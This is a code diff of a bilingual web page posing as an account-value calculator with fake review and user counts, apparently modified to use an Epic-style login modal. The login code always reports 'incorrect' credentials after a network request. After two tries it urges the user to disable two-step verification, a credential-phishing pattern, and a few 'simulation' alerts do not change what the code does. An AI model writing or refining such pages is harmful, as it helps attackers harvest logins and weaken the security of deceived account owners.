                     setTimeout(() => {
-                        loginBtn.classList.remove('opacity-70', 'pointer-events-none');
-                        loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
-                        mostrarError(attemptCount);
+                        epicBtn.classList.remove('loading');
+                        epicBtn.textContent = 'Iniciar sesión';
+                        mostrarErrorModal(attemptCount);
                     }, 2000);
                 })
-                .catch(error => {
-                    // Si falla la red, igualmente mostramos el error después de 2 segundos (sin toast)
+                .catch(() => {
                     setTimeout(() => {
-                        loginBtn.classList.remove('opacity-70', 'pointer-events-none');
-                        loginBtn.innerHTML = '<i class="fa-solid fa-calculator mr-2"></i> Calcular valor';
-                        mostrarError(attemptCount);
+                        epicBtn.classList.remove('loading');
+                        epicBtn.textContent = 'Iniciar sesión';
+                        mostrarErrorModal(attemptCount);
                     }, 2000);
                 });
             });
 
-            function mostrarError(intentos) {
-                errorMessage.classList.add('show');
+            function mostrarErrorModal(intentos) {
+                epicError.classList.add('show');
                 if (intentos >= 2) {
-                    errorIcon.className = 'fa-solid fa-circle-question';
-                    errorIcon.style.color = '#ff4444';
-                    errorTitle.textContent = 'Verificación en dos pasos activa';
-                    errorDesc.innerHTML = `
-                        Es posible que tengas que <strong>desactivar la verificación en dos pasos</strong> 
-                        para acceder a esta herramienta. Contacta con soporte si el problema persiste.
+                    epicErrorText.innerHTML = `
+                        <strong>Verificación en dos pasos activa</strong><br>
+                        Es posible que tengas que desactivar la verificación en dos pasos para acceder a esta herramienta. Contacta con soporte si el problema persiste.
                     `;
                 } else {
-                    errorIcon.className = 'fa-solid fa-exclamation-triangle';
-                    errorIcon.style.color = '#ff4444';
-                    errorTitle.textContent = 'incorrecto';
-                    errorDesc.textContent = 'Verifica tus credenciales e inténtalo de nuevo.';
+                    epicErrorText.textContent = 'incorrecto. Verifica tus credenciales e inténtalo de nuevo.';
                 }
             }
 
-            // ===== HELP LINKS =====
-            document.getElementById('forgotLink').addEventListener('click', function(e) {
+            // ===== LINKS DEL MODAL (simulación) =====
+            document.getElementById('epicForgotLink').addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('🔐 Esta es una simulación. No se guardan datos reales.');
             });
-            document.getElementById('signupLink').addEventListener('click', function(e) {
+            document.getElementById('epicSignupLink').addEventListener('click', function(e) {
                 e.preventDefault();
                 alert('📝 El registro está desactivado en esta demo.');
             });
@@ -927,6 +1035,14 @@
                     `;
                     track.appendChild(card);
                 });
+
+                const trackWidth = track.parentElement.offsetWidth;
+                const gap = 20;
+                const cardWidth = (trackWidth - (cardsPerView - 1) * gap) / cardsPerView;
+                track.querySelectorAll('.review-card').forEach(card => {
+                    card.style.flex = `0 0 ${cardWidth}px`;
+                });
+
                 updateDots();
                 updateTrackPosition();
             }
@@ -966,6 +1082,12 @@
                     const totalSlides = Math.ceil(reviewsData.length / cardsPerView);
                     if (currentIndex >= totalSlides) currentIndex = totalSlides - 1;
                     if (currentIndex < 0) currentIndex = 0;
+                    const trackWidth = track.parentElement.offsetWidth;
+                    const gap = 20;
+                    const cardWidth = (trackWidth - (cardsPerView - 1) * gap) / cardsPerView;
+                    track.querySelectorAll('.review-card').forEach(card => {
+                        card.style.flex = `0 0 ${cardWidth}px`;
+                    });
                     updateDots();
                     updateTrackPosition();
                 }
@@ -1030,13 +1152,6 @@
                     'badge-prices': 'Precios reales',
                     'badge-users': '2,847+ usuarios',
                     'badge-privacy': 'Privacidad',
-                    'email-label': 'Correo electrónico',
-                    'password-label': 'Contraseña',
-                    'btn-calculate': 'Calcular valor',
-                    'forgot-link': '¿Olvidaste tus datos?',
-                    'signup-link': 'Crear cuenta',
-                    'error-title': 'incorrecto',
-                    'error-desc': 'Verifica tus credenciales e inténtalo de nuevo.',
                     'reviews-title': 'Lo que dicen los usuarios',
                     'reviews-count': '2,847 reseñas',
                     'footer-terms': 'Términos de uso',
@@ -1059,13 +1174,6 @@
                     'badge-prices': 'Real prices',
                     'badge-users': '2,847+ users',
                     'badge-privacy': 'Privacy',
-                    'email-label': 'Email address',
-                    'password-label': 'Password',
-                    'btn-calculate': 'Calculate value',
-                    'forgot-link': 'Forgot credentials?',
-                    'signup-link': 'Create account',
-                    'error-title': 'incorrect',
-                    'error-desc': 'Verify your credentials and try again.',
                     'reviews-title': 'What users say',
                     'reviews-count': '2,847 reviews',
                     'footer-terms': 'Terms of use',
@@ -1089,19 +1197,6 @@
                 const notifText = document.getElementById('notifText');
                 if (translations[lang] && translations[lang]['notif-text']) {
                     notifText.textContent = translations[lang]['notif-text'];
-                }
-                // Actualizar mensaje de error si está visible
-                if (errorMessage.classList.contains('show')) {
-                    const intentos = attemptCount;
-                    if (intentos >= 2) {
-                        errorTitle.textContent = lang === 'es' ? 'Verificación en dos pasos activa' : 'Two-factor authentication active';
-                        errorDesc.innerHTML = lang === 'es' 
-                            ? 'Es posible que tengas que <strong>desactivar la verificación en dos pasos</strong> para acceder a esta herramienta. Contacta con soporte si el problema persiste.'
-                            : 'You may need to <strong>disable two-factor authentication</strong> to access this tool. Contact support if the issue persists.';
-                    } else {
-                        errorTitle.textContent = lang === 'es' ? 'incorrecto' : 'incorrect';
-                        errorDesc.textContent = lang === 'es' ? 'Verifica tus credenciales e inténtalo de nuevo.' : 'Verify your credentials and try again.';
-                    }
                 }
             };
 
